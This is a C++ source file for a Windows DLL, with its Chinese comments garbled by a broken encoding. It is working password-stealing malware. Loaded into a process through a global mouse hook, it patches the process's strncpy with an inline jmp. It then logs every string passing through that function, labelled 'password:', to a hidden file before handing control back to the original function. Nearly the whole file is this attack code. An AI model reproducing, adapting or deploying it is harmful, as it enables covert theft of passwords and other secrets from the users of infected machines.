// Hook.cpp : Defines the initialization routines for the DLL.
//

#include "stdafx.h"
#include "Hook.h"
#include "info.h"


#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif
/////////////////////////////////////////////////////////////////////////////
// CHookApp

BEGIN_MESSAGE_MAP(CHookApp, CWinApp)
	//{{AFX_MSG_MAP(CHookApp)
	// NOTE - the ClassWizard will add and remove mapping macros here.
	//    DO NOT EDIT what you see in these blocks of generated code!
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CHookApp construction

CHookApp::CHookApp()
{
	// TODO: add construction code here,
	// Place all significant initialization in InitInstance
}

/////////////////////////////////////////////////////////////////////////////
// The one and only CHookApp object

CHookApp theApp;

//��������

//��ͬInstance����ĸñ���
#pragma data_seg("SHARED")
static HHOOK  hhk=NULL; //��깳�Ӿ��
static HINSTANCE hinst=NULL; //��dll��ʵ����� (Hook.dll)
#pragma data_seg()
#pragma comment(linker, "/section:SHARED,rws")
//���ϵı�������Ŷ!
bool bHook=false; //�Ƿ�Hook�˺���
bool m_bInjected=false; //�Ƿ��API������Hook
BYTE OldCode[5]; //�ϵ�ϵͳAPI��ڴ���
BYTE NewCode[5]; //Ҫ��ת��API���� (jmp xxxx)
typedef char* (*Sysstrncpy)(char* strDest,const char* strSource, size_t count);//msvcrt.dll�е�strncpy��������
Sysstrncpy sysstrncpy; //msvcrt.dll�е�strncpy����
HANDLE hProcess=NULL; //�������̵ľ��
FARPROC pfstrncpy;  //ָ��strncpy������Զָ��
DWORD dwPid;  //��������ID
//��־�ļ�
RcLogInfo logger;
//���뱣���ļ�
RcLogInfo hook;

//end of ��������
//��������
void HookOn(); //��������
void HookOff(); //�رչ���
LRESULT CALLBACK MouseProc(int nCode,WPARAM wParam,LPARAM lParam); //��깳�Ӻ���
void Inject(); //�������ע�䣬�滻��ڵĺ���
char* Mystrncpy(char* strDest,const char* strSource, size_t count); //���Ƕ�����µ�strncpy()����
BOOL InstallHook(); //��װ���Ӻ���
void UninstallHook(); //ж�ع��Ӻ���
//end of ��������



BOOL CHookApp::InitInstance() 
{
	if (!logger.openFile("\\inject.log")){
		return false;
	}

	logger.WriteLogInfo("remote dll begin install");
	//��ȡ����dll���
	hinst=::AfxGetInstanceHandle();
	//��ȡ��������id�;��
	DWORD dwPid=::GetCurrentProcessId();
	hProcess=OpenProcess(PROCESS_ALL_ACCESS,0,dwPid); 
	//���ú���ע��
	Inject();

	logger.closeFile();

	return CWinApp::InitInstance();
}

int CHookApp::ExitInstance() 
{
	// ���add���ӿ��ţ�����ر�
	if (bHook)
		HookOff();

	return CWinApp::ExitInstance();
}

BOOL InstallHook()
{

	hhk=::SetWindowsHookEx(WH_MOUSE,MouseProc,hinst,0);

	if (hhk==NULL)
	{
		DWORD err=::GetLastError();
		char temp[MAX_PATH];
		sprintf(temp, "[error %d] : hook SetWindowsHookEx()\n", err);
		logger.WriteLogInfo(temp);
		return false;
	}

	logger.WriteLogInfo("hool installed!!\n");

	return true;
}

void UninstallHook()
{
	if (hhk!=NULL){
		::UnhookWindowsHookEx(hhk);
	}

	logger.WriteLogInfo("Unhooked!!\n");
}

void Inject()
{

	if (m_bInjected==false)
	{
		m_bInjected=true;

		HMODULE hmod = LoadLibraryA("msvcrt.dll");
		char tmp[MAX_PATH]={'\0'};
		sprintf(tmp, "msvcrt addr : 0x%x\n", (DWORD)hmod);
		logger.WriteLogInfo(tmp);

		if (!hmod){
			logger.WriteLogInfo("dll can't load\n");
		}
		sysstrncpy=(Sysstrncpy)::GetProcAddress(hmod,"strncpy");
		if (!sysstrncpy){
			logger.WriteLogInfo("strncpy can't find\n");
		}

		sprintf(tmp, "strncpy addr : 0x%x\n", (DWORD) sysstrncpy);
		logger.WriteLogInfo(tmp);

		//test function
		char buf[8];
		sysstrncpy(buf, "1234567", 7);
		if (buf[0] == '1'){
			logger.WriteLogInfo("strncpy excute success!!\n");
		}else{
			logger.WriteLogInfo("strncpy excute failed!!\n");
		}


		pfstrncpy=(FARPROC)sysstrncpy;


		if (pfstrncpy==NULL)
		{
			logger.WriteLogInfo("cannot locate strncpy()\n");
		}



		logger.WriteLogInfo("begin alter function\n");
		// ��add()����ڴ��뱣�浽OldCode��
		_asm 
		{ 
			lea edi,OldCode 
				mov esi,pfstrncpy 
				cld 
				movsd 
				movsb 
		}

		NewCode[0]=0xe9;//��һ���ֽ�0xe9�൱��jmpָ��
		//��ȡMyadd()����Ե�ַ
		_asm 
		{ 
			lea eax,Mystrncpy
				mov ebx,pfstrncpy 
				sub eax,ebx 
				sub eax,5 
				mov dword ptr [NewCode+1],eax 
		} 

		logger.WriteLogInfo("end alter funtion\n");
		//�����ϣ�����NewCode[]������൱��ָ�� jmp Myadd
		HookOn();
	}
}


char* Mystrncpy(char* strDest,const char* strSource, size_t count)
{
	//password.Format(_T("password : %s"), strSource);

	hook.openFile("\\hook");
	char tmp[MAX_PATH]={'\0'};
	sprintf(tmp, "password:%s\n", strSource);
	hook.WriteLogInfo(tmp);
	hook.closeFile();

	//�ػ��˶�strncpy()�ĵ��ã����Ǹ�a,b����1

	HookOff();//�ص�Mystrncpy()���ӷ�ֹ��ѭ��

	char* ret;
	ret=sysstrncpy(strDest,strSource, count);

	HookOn();//����Mystrncpy()����

	return ret;
}


LRESULT CALLBACK MouseProc(
						   int nCode,      // hook code
						   WPARAM wParam,  // message identifier
						   LPARAM lParam   // mouse coordinates
						   )
{

	LRESULT RetVal= CallNextHookEx(hhk,nCode,wParam,lParam);
	return RetVal;
}


void HookOn() 
{ 
	if(hProcess==NULL){
		logger.WriteLogInfo("hprocess is null\n");
	}

	DWORD dwTemp=0;
	DWORD dwOldProtect;

	//���ڴ汣��ģʽ��Ϊ��д,��ģʽ������dwOldProtect
	if (!VirtualProtectEx(hProcess,pfstrncpy,5,PAGE_READWRITE,&dwOldProtect)){
		logger.WriteLogInfo("VirtualProtectEx failed\n");
	}
	//������������add��ǰ5���ֽڸ�ΪJmp Myadd 
	if (!WriteProcessMemory(hProcess,pfstrncpy,NewCode,5,0)){
		logger.WriteLogInfo("WriteProcessMemory failed\n");
	}
	//���ڴ汣��ģʽ�Ļ�ΪdwOldProtect
	if (!VirtualProtectEx(hProcess,pfstrncpy,5,dwOldProtect,&dwTemp)){
		logger.WriteLogInfo("VirtualProtectEx failed\n");
	}


	bHook=true; 
}

void HookOff()//������������add()����ڴ���ָ�
{ 
	ASSERT(hProcess!=NULL);

	DWORD dwTemp=0;
	DWORD dwOldProtect;

	VirtualProtectEx(hProcess,pfstrncpy,5,PAGE_READWRITE,&dwOldProtect); 
	WriteProcessMemory(hProcess,pfstrncpy,OldCode,5,0); 
	VirtualProtectEx(hProcess,pfstrncpy,5,dwOldProtect,&dwTemp); 
	bHook=false; 
}